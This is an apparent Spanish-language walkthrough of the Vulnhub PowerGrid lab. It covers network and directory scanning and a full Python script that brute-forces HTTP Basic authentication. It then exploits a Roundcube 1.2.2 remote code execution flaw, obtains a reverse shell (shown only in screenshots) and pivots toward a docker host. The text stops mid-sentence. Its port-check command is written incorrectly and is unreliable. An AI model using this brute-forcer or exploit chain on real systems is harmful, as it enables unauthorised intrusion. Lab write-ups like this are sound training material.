---
title: "PowerGrid - Vulnhub"
layout: post
date: 2023-12-12 22:10
tags:
  - Vulnhub
  - PowerGrid
  - GPG
  - RCE
  - Python
  - BruteForce
  - php
  - Pivoting
image: /assets/images/powergrid.jpeg
headerImage: true
projects: false
hidden: false
description: "PogerGrid - Vunlhub"
category: blog
author: CAHOn3R
externalLink: false
---

# Descripción

Los ciberdelincuentes se han apoderado de la red energética en toda Europa. Como miembro del servicio de seguridad, usted tiene la tarea de ingresar a su servidor, obtener acceso raíz y evitar que ejecuten su malware antes de que sea demasiado tarde.

Sabemos por información de inteligencia anterior que este grupo a veces usa contraseñas débiles. Le recomendamos que primero observe este vector de ataque; asegúrese de configurar sus herramientas correctamente. No tenemos tiempo que perder.

Des afortunadamente, los delincuentes han puesto en marcha un reloj de 3 horas. ¿Podrás llegar a su servidor a tiempo antes de que se implemente su malware y destruyan la evidencia en su servidor?

Este ejercicio está diseñado para completarse de una sola vez. Apagar la máquina virtual no pausará el temporizador. Una vez finalizado el cronómetro, la máquina CTF se apagará y no podrá iniciarla. Mantenga una copia de seguridad local del CTF antes de comenzar, en caso de que desee intentarlo por segunda vez.

# Fase de reconocimiento

Esta vez al tratarse de una maquina de *Vulnhub* y correrla en local empezaremos el reconocimiento escaneando nuestra propia red para encontrar la IP de la maquina victima

```bash
arp-scan -I eth0 --localnet --ignoredups

192.168.0.37	00:0c:29:68:37:0b	VMware, Inc. 

-I # para especificar la Interfaz que queremos escanear
--localnet # para decir que queremos que sea un escaneo local
--ignoredups # para que no reporte duplicados
```

como vemos la IP de la maquina victima es **192.168.0.37** así que procedemos con el escaneo de puertos

```bash
nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn -oG allPorts 192.168.0.37

PORT    STATE SERVICE REASON
80/tcp  open  http    syn-ack ttl 64
143/tcp open  imap    syn-ack ttl 64
993/tcp open  imaps   syn-ack ttl 64
MAC Address: 00:0C:29:68:37:0B (VMware)

-p- # para escanear los 65535 puertos que existen
-sS # para realizar un escaneo tipo "SYN scan"
--min-rate 5000 # para indicarle no se envien menos de 5k paquetes por segundo
--open # para que solo reporte puertos abiertos
-vvv # para que muestre por consola lo máximo posible y lo antes posible
-n # para realizar un escaneo prescindiendo de la resolución de nombres de dominio
-Pn # para que no realice la detección del estado del host antes de iniciar el escaneo
-oG # para especificar un formato de salida en modo greppable en el archivo allPorts
```

Y nos reporta 3 puertos abiertos, de momento nos quedaremos con el **80**

[<img src="/assets/images/vulnhub/PowerGrid/captura1.png">](/assets/images/vulnhub/PowerGrid/captura1.png)

Podemos ver que han hackeado la web como nos decía en la descripción y que piden un rescate, también vemos al final del texto los nombres de usuario de los **cibercriminales** una vez visto esto empezamos el escaneo de directorios

```bash
gobuster dir -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u 'http://192.168.0.37/'
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.0.37/
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 313] [--> http://192.168.0.37/images/]
/zmail                (Status: 401) [Size: 459]
```
# Fase de Explotación

Vemos el directorio **/zmail** y tratamos de acceder a el, nos encontramos con que necesitamos autentificarnos, en la descripción de la maquina ya nos dejaba entre ver que podía ser posible que necesitásemos hacer uso de la fuerza bruta, podríamos hacerlo con herramientas com hydra por ejemplo pero en esta ocasión haremos un script en **python3**.

Lo primero que haremos será interceptar la petición con **BurpSuite**, la mandaremos al repeater con **CTRL+R** 

[<img src="/assets/images/vulnhub/PowerGrid/captura2.png">](/assets/images/vulnhub/PowerGrid/captura2.png)
En color azul podemos ver como se manda la **Authorization** y el parton que se emplea, en este caso se manda con este formato test:test y luego se codifica en **Base64** y se envia al servidor con el metodo GET, en rojo vemos la respuesta del servidor que es **401 unauthorized** nos fijaremos en todo esto para hacer el script en python

```python
#!/usr/bin/env python3

import requests
import sys
import signal
import time
from base64 import b64encode
from pwn import log

def ctrlc(signal, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, ctrlc)

main_url = "http://ip/zmail"

def make_authentication(cadenab64, user, password, p1):
    cadenab64 = cadenab64.decode()
    headers = {
        'Authorization': 'Basic %s' % cadenab64
    }
    try:
        r = requests.get(main_url, headers=headers)
        if r.status_code != 401:
            p1.success(f"Contraseña encontrada para {user}: {password}")
    except Exception as e:
        p1.failure(f"Error al hacer la solicitud para {user} - {password}: {e}")

def make_authorization(users, password_file):
    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando proceso de fuerza bruta")
    time.sleep(2)
    
    for user in users:
        p1.status(f"Probando contraseñas para el usuario: {user}")
        
        with open(password_file, "r") as f:
            for password in map(lambda x: x.strip(), f.readlines()):
                cadena = f"{user}:{password}"
                p1.status(f"Probando la contraseña para {user}: {password}")
                
                cadenab64 = b64encode(cadena.encode())
                make_authentication(cadenab64, user, password, p1)

if __name__ == '__main__':
    users = ["deez1", "p48", "all2"]
    password_file = "/ruta/diccionario.txt"
    make_authorization(users, password_file)

```


Vale tenemos credenciales usuario **p48** y contraseña **electrico** 

> Os lo dejo las creds por si queréis practicar con el script haciendo un diccionario mas pequeño que contenga la pass

Para continuar entramos con el user y la pass, y vemos otro inicio de sesión, probamos las mismas creds y... para dentro.

Una vez dentro podemos ver lo que parece un servicio de email [Qué es roundcube](https://es.wikipedia.org/wiki/Roundcube)
rápidamente nos damos cuenta de que tenemos un mensaje **importante** procedemos a abrirlo y lo que vemos es lo siguiente 
[<img src="/assets/images/vulnhub/PowerGrid/captura3.png">](/assets/images/vulnhub/PowerGrid/captura3.png)
En azul vemos pistas que probablemente nos sirvan de algo mas adelante, aun que ya se intuye por donde pueden ir los tiros, y en amarillo vemos una clave SSH cifrada, la cual sin la clave privada para descifrarla nos sirve de bien poco...

dado que solo tenemos el nombre del servicio me pongo a buscar vulnerabilidades relacionadas con el, primero busco la version para ser un poco mas preciso.
Veo un about justo encima de rondcube en la esquina superior izquierda, y ahi esta la version, en este caso la 1.2.2 

```bash
searchsploit roundcube 1.2.2

Roundcube 1.2.2 - Remote Code Execution  php/webapps/40892.txt
```
> searchsploit -u 
> Con esto actualizamos la base de datos que contiene todas las vulns

Tenemos un **RCE** para la version que necesitamos, ahora falta probar si funciona.
```bash
searchsploit -x php/webapps/40892.txt
-x # para ver el contenido sin necesidad de descargarlo
```
Tal y como nos dice en el **Proof of concept** tendremos que mandar un email especialmente diseñado para ejecutar código **php** en el Subject del correo en cuestión, así que le damos a **compose** ponemos un ejemplo y capturamos la petición con **burpSuite**.
Nos mandamos la petición al repeater y la alteramos tal y como dice el **POC**

[<img src="/assets/images/vulnhub/PowerGrid/captura4.png">](/assets/images/vulnhub/PowerGrid/captura4.png)
Aquí lo que estamos haciendo realmente es abusar de una vulnerabilidad que nos permite escribir un archivo **php** y posteriormente ejecutarlo, una vez subido el archivo ya tenemos **RCE** ejecución remota de comandos, así que nos entablamos una reverse shell con **bash**
[<img src="/assets/images/vulnhub/PowerGrid/captura5.png">](/assets/images/vulnhub/PowerGrid/captura5.png)una vez ganado acceso al sistema hacemos el tratamiento de la TTY para tener una consola interactiva
```bash
www-data@powergrid:/var/www/html$ script /dev/null -c bash
ctrl+z
			reset xterm
www-data@powergrid:/var/www/html$export TERM=xterm SHELL=bash
www-data@powergrid:/var/www/html$ stty rows 40 columns 140
```
Hago un `hostname -I` y veo que la maquina tiene 2 interfaces de red, una de ellas pertenece a docker, pruebo un ping a la 172.17.0.2 por ser la siguiente a la mía y obtengo traza 
[<img src="/assets/images/vulnhub/PowerGrid/captura6.png">](/assets/images/vulnhub/PowerGrid/captura6.png)
Esto es lo que tengo en mente, dado que me menciona **SSH** y tengo traza con la 172.17.0.2 le mando una cadena vacía al puerto 22 para ver si el código de estado que me devuelve es 0, lo que querría decir que esta abierto...
```bash
echo '' > /dev/null/172.17.0.2/22 2>/dev/null
echo $?
0
```
El puerto 22 está abierto pero como www-data no puedo hacer mucho así que pruebo si hay re utilización de credenciales por parte del usuario **p48** y funciona
```bash
su p48
Password: electrico
```
Me dirijo a su directorio de usuario y veo un archivo **privkey.gpg** blanco y en botella...
Tenemos un mensaje cifrado en el email, tenemos una private key y tenemos un tío que utili
